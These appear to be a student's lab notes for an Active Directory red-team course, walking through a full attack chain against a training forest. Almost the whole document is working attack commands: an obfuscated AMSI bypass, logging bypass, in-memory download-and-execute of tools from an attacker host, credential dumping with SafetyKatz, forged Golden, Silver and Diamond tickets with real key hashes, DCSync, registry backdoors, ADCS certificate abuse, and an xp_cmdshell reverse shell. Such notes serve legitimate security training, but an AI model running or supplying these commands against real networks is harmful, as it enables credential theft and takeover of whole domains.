![[Lab Environment Attack_Paths.png]]

```powershell title:""
```
# Enumeration

```powershell title:"List Specific Properties for Users"
Get-DomainUser | select -ExpandProperty samaccountname
```
  
```powershell title:"List Domain Computers"
Get-DomainComputer | select -ExpandProperty dnshostname
```

```powershell title:"Details of Domain Admins Group"
Get-DomainGroup -Identity "Domain Admins"
```

```powershell title:"Enumerate Members of DA Group"
Get-DomainGroupMember -Identity "Domain Admins"
```

```powershell title:"Enumerate Members of EA Group"
Get-DomainGroupMember -Identity "Enterprise Admins"
```

Since, this is not a root domain, the above command will return nothing. We need to query the root domain as Enterprise Admins group is present only in the root of a forest.

```powershell title:"Enumerate Members of EA Group"
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

```powershell title:"Get OUs"
Get-DomainOU
```

```powershell title:"Get GPOs"
Get-DomainGpo
```

```powershell title:"Enumerate All Domains in Forest"
Get-ForestDomain
```

```powershell title:"Enumerate Domain Trust"
Get-DomainTrust
```

# Local Privilege Escalation

```PowerShell title="Abuse AbyssWebServer Service"
Invoke-ServiceAbuse -Name "AbyssWebServer" -UserName 'dcorp\student467' -Verbose
```

# Privilege Escalation

```powershell title:"Check Local Admin Access on Remote Machines"
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

We can connect to remote servers using `winrs`

```powershell title:"Connect to Remote Server using Winrs"
winrs -r:dcorp-adminsrv cmd
```

Can also be done using PowerShell Remoting

```powershell title="Connect to Remote Server using PS-Remote"
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

We can hunt for Admin's active sessions on other machines by using `Invoke-SessionHunter`:

```PowerShell title="Hunt for DA sessions"
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

Now we can transfer `PowerView` or other tools for further enumeration on target machines:
First we bypass **Enhanced Script Block Logging**:

```PowerShell title="Bypass SB Logging"
iex (iwr http://172.16.100.67/sbloggingbypass.txt -UseBasicParsing)
```

Then we bypass **AMSI**: (Get more bypasses from here https://amsi.fail/)

```PowerShell title="AMSI Bypass"
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Now we can download & execute `PowerView` in memory:

```powershell title="Download and Execute tools in memory"
iex ((New-Object Net.WebClient)
.DownloadString('http://172.16.100.67/PowerView.ps1'))
```

Now we can check for Domain Admin sessions using `PowerView`:

```Powershell title="Check for DA sessions"
Find-DomainUserLocation

Output:
UserDomain  	: dcorp
UserName    	: svcadmin
ComputerName	: dcorp-mgmt.dollarcorp.moneycorp.local**
IPAddress   	: 172.16.4.44
SessionFrom 	:
SessionFromName :
LocalAdmin  	:
[snip]
```

Great! There is a domain admin session on dcorp-mgmt server!

Now, we can abuse this using `winrs` or PowerShell Remoting!

**Use `winrs` to access` dcorp-mgmt`**

Let's check if we can execute commands on `dcorp-mgmt` server and if the `winrm` port is open:

```PowerShell
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

```PowerShell
Output:
COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin
```

Using **`winrs`**, add the following port forwarding on **`dcorp-mgmt`** to avoid detection on **`dcorp-mgmt`**:

```PowerShell title="Add Port Forwarding on Target Host to Avoid Detection"
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"
```

Download and Execute **`SafetyKatz`** in-memory:

```PowerShell title="Execute SafetyKatz in-memory"
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

Enumerate AppLocker Policy:

```PowerShell title="Enumerate AppLocker Policy"
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```PowerShell title="Open Group Policy Management"
gpmc.msc
```

**To Disable AppLocker:**

Domains -> dollarcorp.moneycorp.local -> Applocked -> Right click on the Applocker policy and click on Edit

In the new window, Expand Policies -> Windows Settings -> Security Settings -> Application Control Policies -> Applocker


```PowerShell title="Force Update Group Policies on Host"
gpupdate /force
```

# Persistence

```PowerShell title="Hunt for users with SPN"
Get-DomainUser -SPN -Properties samaccountname, serviceprincipalname
```

```PowerShell title="Golden Ticket Attack - Step 1"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

```PowerShell title="Golden Ticket Attack - Step 2"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

```PowerShell title="Silver Ticket Attack - HTTP Service"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

```PowerShell title="Silver Ticket Attack - WMI Service - Part 1"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

```PowerShell title="Silver Ticket Attack - WMI Service - Part 2"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

```PowerShell title="Diamond Ticket Attack"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Abusing DSRM Credentials

```PowerShell title="Golden Ticket"
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```powershell title="Copy Loader.exe to DC"
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

```PowerShell title="Access DC via winrm"
winrs -r:dcorp-dc cmd
```

```PowerShell title="Port Forwarding"
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

```PowerShell title="Extract Credentials from SAM hive"
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit" 
```

The **DSRM Administrator** is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC. We can do this as follows:

```PowerShell title="Change DSRM logon behavior"
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

Now we can use **Pass the Hash** (Not Over-Pass the Hash) for the DSRM administrator

```PowerShell title="Over-Pass the Hash"
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```

From the new procees, we can now access dcorp-dc. Note that we are using PowerShell Remoting with IP address and Authentication - 'NegotiateWithImplicitCredential' as we are using NTLM authentication. So, we must modify TrustedHosts for the student VM. Run the below command from an elevated PowerShell session:

```PowerShell title="Modify TrustedHosts"
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```

```PowerShell title="Access the DC"
Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

## DCSync

Check if a user has **Replication Rights** 

```PowerShell title="Check for Replication Rights - PowerView"
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```

If the user doesn't have **Replication Rights**, we can add manually add it:

```PowerShell title="Start Process as Domain Admin"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```PowerShell title="Add DCSync Rights"
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

Now we can extract the hash of **`krbtgt`** or any other user:

```PowerShell title="Extract krbtgt hash"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

## Security Descriptors

Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. Below command (to be run as Domain Administrator) modifies the host security descriptors for WMI on the DC to allow student access to WMI:

```PowerShell title="Import RACE tool"
. C:\AD\Tools\RACE.ps1
```

```PowerShell
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

```PowerShell title="Execute WMI queries on DC as student"
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

Similar modification can be done to PowerShell remoting configuration.

```PowerShell
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

Now, we can run commands using PowerShell remoting on the DC without DA privileges:

```PowerShell
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

To retrieve machine account hash without DA, first we need to modify permissions on the DC.

Run the below command as DA:

```PowerShell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
```

Now, we can retrieve hash as studentx:

```PowerShell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```


# Privilege Escalation
## Kerbroasting

```PowerShell title="Find Services running with User Accounts"
Get-DomainUser -SPN
```

We can use Rubeus to get hashes for the svcadmin account. Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if 'This account supports Kerberos AES 128/256 bit encryption' is set for a service account, the below command will not request its hashes.

```PowerShell title="Request Hashes for a user"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

```PowerShell title="Kerberoasted User Hash Cracking"
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

### Unconstrained Delegation

```PowerShell title="Find Servers that has Unconstrained Delegation enabled"
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

An important perquisite for  **Unconstrained Delegation** is to have Admin Access on the machine.

Then we run Rubeus in monitor mode:

```PowerShell title="Rubeus in Monitor Mode"
Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

Now we can use any of the following:

**Use the Printer Bug for Coercion**

In the command below, we'll force authentication from **`dcorp-dc$`**

```PowerShell title="Printer Bug Coercion"
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

**Use the Windows Search Protocol (MS-WSP) for Coercion**

```PowerShell title="MS-WSP Coercion"
C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```

**Use the Distributed File System Protocol (MS-DFSNM) for Coercion**

```PowerShell title="MS-DFSNM Coercion"
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

#### Escalation to Enterprise Admin

Trigger authentication from **`mcorp-dc`** to **`dcorp-appsrv`**

```PowerShell title="MS-RPRN Coercion"
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

After getting a ticket from any of the previous commands, we can pass the ticket using Rubeus

```PowerShell title="Rubeus Pass the Ticker"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx..
```

### Constrained Delegation

```PowerShell title="Enumerate Users with Constrained Delegation"
Get-DomainUser -TrustedToAuth
```

**Abuse Constrained Delegation using websvc with Rubeus**

```PowerShell title="Abuse Constrained Delegation using Rubeus"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

```PowerShell title="Enumerate Computer Accounts with Constrained Delegation"
Get-DomainComputer -TrustedToAuth
```

**Abuse Constrained Delegation using `dcorp-adminsrv` with Rubeus**

```PowerShell title="Abuse Constrained Delegation using Rubeus"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

> [!note]
> The **TIME** service on a Domain Controller runs under the context of the **Machine Account** (`dcorp-dc$`), just like **LDAP**, **CIFS**, and **HOST**.
> ****
> When you abuse Constrained Delegation (S4U2Proxy) to request a Kerberos Service Ticket for `TIME/dcorp-dc`, that ticket is encrypted using the `dcorp-dc$` machine hash.
> ****
> Because the Active Directory service (LDAP) runs as the same account (`dcorp-dc$`) and often does not strictly validate the Service Principal Name (SPN) inside the ticket once decrypted, you can use the valid ticket you got for **TIME** to authenticate to **LDAP**.

Now, we can abuse **LDAP** ticket too:

```PowerShell title="Abuse LDAP - Constrained Delegation"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

## Enterprise Admins

### SID History Injection

Start a process with DA privileges (Golden Ticket Attack)

```PowerShell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Then extract the trust key from DC

```Powershell
winrs -r:dcorp-dc cmd
```

```PowerShell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

Forge a ticket with SID History of Enterprise Admins

```PowerShell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:hash /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

Then use the generated ticket

```PowerShell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:
```

```PowerShell title="Access"
winrs -r:mcorp-dc.moneycorp.local cmd
```


```PowerShell title="Inter-Realm TGT"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```

Now we can execute DCSync against **moneycorp.local**

```PowerShell title="DCSync on Forest Root"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

## Across External Trust

We need to extract the **Trust Key** for the trust between **`dollarcorp`** and **`eurocorp`**.

Conduct **Golden Ticket** attack, get access to  **`dcorp-dc`**, then extract the trust key:

```PowerShell title="Extract Trust Key"
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

Then **Forge a Referral Ticket**

Let's Forge a referral ticket. Note that we are not injecting any SID History here as it would be filtered out

```PowerShell title="Forge Referal Ticket - Rubeus"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:7a3b552565201402805d4a287e87069f /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

```PowerShell title='Pass the Ticket'
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```
## ADCS

### ESC1

Find AD CS template that has ENROLLEE_SUPPLIES_SUBJECT

```PowerShell title="Find AD CS template with ENROLLEE_SUPPLIES_SUBJECT"
Certify.exe find /enrolleeSuppliesSubject
```

```PowerShell title="Request Certificate for Domain Administrator"
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

Copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to esc1.pem

```PowerShell title="Convert pem to pfx"
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

```PowerShell title="Request TGT for DA using pfx file"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
```

We can use the same method to escalate to **Enterprise Administrator**

```PowerShell title="Escalate to Enterprise Administrator"
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```

```PowerShell title="Request TGT for EA using pfx file"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt
```

### ESC3

```Powershell title="Search for Vulnerable Templates"
C:\AD\Tools\Certify.exe find /vulnerable
```

```PowerShell
C:\AD\Tools>**C:\AD\Tools\Certify.exe find /vulnerable**
[snip]
[!] Vulnerable Certificates Templates :
 CA Name : mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA
 **Template Name : SmartCardEnrollment-Agent**
 Schema Version : 2
 Validity Period : 10 years
 Renewal Period : 6 weeks
 msPKI-Certificates-Name-Flag : SUBJECT_ALT_REQUIRE_UPN,
SUBJECT_REQUIRE_DIRECTORY_PATH
 mspki-enrollment-flag : AUTO_ENROLLMENT
 Authorized Signatures Required : 0
**pkiextendedkeyusage : Certificate Request Agent**
 mspki-certificate-application-policy : Certificate Request Agent
 Permissions
 Enrollment Permissions
 **Enrollment Rights : dcorp\Domain Users S-1-5-21-335606122-960912869-3279953914-513**
 mcorp\Domain Admins S-1-5-21-
335606122-960912869-3279953914-512
 mcorp\Enterprise Admins S-1-5-21-
335606122-960912869-3279953914-519
```

```Powershell title="Enumerate Templates"
C:\AD\Tools\Certify.exe find /vulnerable
```

```PowerShell
C:\AD\Tools>**C:\AD\Tools\Certify.exe find**
[snip]	
CA Name : mcorp-dc.moneycorp.local\moneycorpMCORP-DC-CA
 **Template Name : SmartCardEnrollment-Users**
 Schema Version : 2
 Validity Period : 10 years
 Renewal Period : 6 weeks
 msPKI-Certificates-Name-Flag : SUBJECT_ALT_REQUIRE_UPN,
SUBJECT_REQUIRE_DIRECTORY_PATH
 mspki-enrollment-flag : AUTO_ENROLLMENT
 Authorized Signatures Required : 1
**Application Policies : Certificate Request Agent**
 pkiextendedkeyusage : Client Authentication, Encrypting
File System, Secure Email
 mspki-certificate-application-policy : Client Authentication, Encrypting
File System, Secure Email
 Permissions
 Enrollment Permissions
**Enrollment Rights : dcorp\Domain Users S-1-5-21-719815819-3726368948-3917688648-513**
 mcorp\Domain Admins S-1-5-21-
719815819-3726368948-3917688648-512
 mcorp\Enterprise Admins S-1-5-21-
719815819-3726368948-3917688648-519
```

**Vulnerability:** This is an "Enrollment Agent" abuse chain that leverages two misconfigured templates to escalate privileges. 

**The Chain:**
1. **Template 1 (The Agent):** A template (e.g., `SmartCardEnrollment-Agent`) that grants the `Certificate Request Agent` EKU. It is vulnerable because it allows low-privilege users (e.g., Domain Users) to enroll without approval (`Authorized Signatures: 0`).
2. **Template 2 (The Target):** A template (e.g., `SmartCardEnrollment-Users`) that enables `Client Authentication`. It is "locked" by requiring one authorized signature (`Authorized Signatures: 1`) from an Enrollment Agent. 

**Attack Path:**
- **Step 1:** Request a certificate from **Template 1** to become a valid "Enrollment Agent."
- **Step 2:** Use the certificate from Step 1 to **sign a CSR** for **Template 2** on behalf of the `Administrator` (or a DA).
- **Step 3:** The CA accepts the valid signature and issues the Administrator certificate, which is then used to authenticate (Pass-the-Certificate).

Request an **Enrollment Agent Certificate** from the template `"SmartCardEnrollment-Agent"`:

```PowerShell title="Request Enrollment Agent Certificate"
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

Save `esc3.pem` and convert to .pfx

```PowerShell title="Convert to pfx"
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

Now we can use the **Enrollment Agent Certificate** to request a certificate for DA from the template `SmartCardEnrollment-Users`:

```PowerShell title="Request Certificate for DA"
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

Save `esc3-DA.pem` and convert to .pfx

```PowerShell title="Convert to pfx"
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

Now use the pfx to Request a TGT for DA

```PowerShell title="Request TGT for DA"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt
```

We can also use the same approach to escalate to Enterprise Admin

```PowerShell title="Request Certificate for EA"
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

```PowerShell title="Request TGT for EA"
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

# Trust Abuse

```PowerShell title="MSSQL Enumeration - PowerUpSQL"
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

```PowerShell title="Crawl Database Links Automatically"
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

```PowerShell title="Command Execution using xp_cmdshell"
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```

```PowerShell title="ReverseShell via xp_cmdshell"
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
```


---

**Services Cheat Sheet:**

| **If you want to run this command...** | **You need a ticket for this Service:** |
| -------------------------------------- | --------------------------------------- |
| `dir \\server\share` (File Explorer)   | **cifs**                                |
| `copy payload.exe \\server\c$`         | **cifs**                                |
| `Enter-PSSession -ComputerName server` | **http** (WinRM)                        |
| `winrs -r:server cmd`                  | **http** (WinRM)                        |
| `mstsc /v:server` (Remote Desktop)     | **termsrv**                             |
| `schtasks /create /s server ...`       | **host**                                |
| `lsadump::dcsync` (Mimikatz)           | **ldap**                                |
